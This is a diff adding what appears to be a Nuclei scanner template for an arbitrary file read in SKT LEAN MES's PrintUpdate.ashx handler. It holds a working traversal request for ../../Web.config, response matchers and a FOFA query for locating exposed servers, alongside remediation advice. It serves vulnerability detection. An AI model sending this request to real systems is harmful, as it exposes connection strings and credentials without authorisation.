@@ -1,0 +1,50 @@
+id: leanmes-printupdate-lfi
+
+info:
+  name: SKT LEAN MES /Handler/PrintUpdate.ashx - Arbitrary File Read (Path Traversal)
+  author: qwtd
+  severity: high
+  description: |
+    SKT LEAN MES contains an arbitrary file read vulnerability in /Handler/PrintUpdate.ashx.
+    When action=DownLoadFile, the file parameter is not properly sanitized, allowing attackers
+    to use directory traversal sequences to read arbitrary files on the server, such as web.config.
+  remediation: |
+    - Apply the vendor patch or upgrade to a fixed version as soon as possible.
+    - Strictly validate and canonicalize the file parameter before use.
+    - Reject traversal sequences such as ../, ..\, and their encoded variants.
+    - Restrict access to /Handler/PrintUpdate.ashx to authenticated users and trusted networks only.
+    - Move sensitive configuration files outside the web root where possible and reduce read permissions for the web process.
+  impact: |
+    Successful exploitation may expose sensitive configuration files, connection strings, credentials,
+    internal paths, and other application secrets, which can be used for further compromise.
+  reference:
+    - https://mrxn.net/jswz/lean-mes-PrintUpdate-fileupload-rce-fileread.html
+  classification:
+    cwe-id: CWE-22
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
+    cvss-score: 7.5
+  metadata:
+    vendor: skt
+    product: lean-mes
+    verified: false
+    max-request: 1
+    fofa-query: (title="LEAN MES - 用户登录" && body="LEAN MES") || body="Content/js/skt.utility.checkmobile.js" || body="../MobileApp/VerifyError.aspx" || body="Content/login/login2/multiplant_top.png"
+  tags: 深科特-LEAN-MES
+
+http:
+  - raw:
+      - |
+        GET /Handler/PrintUpdate.ashx?action=DownLoadFile&file=../../Web.config HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - '<?xml'
+          - 'appSettings'
+        condition: and
+
+      - type: status
+        status:
+          - 200
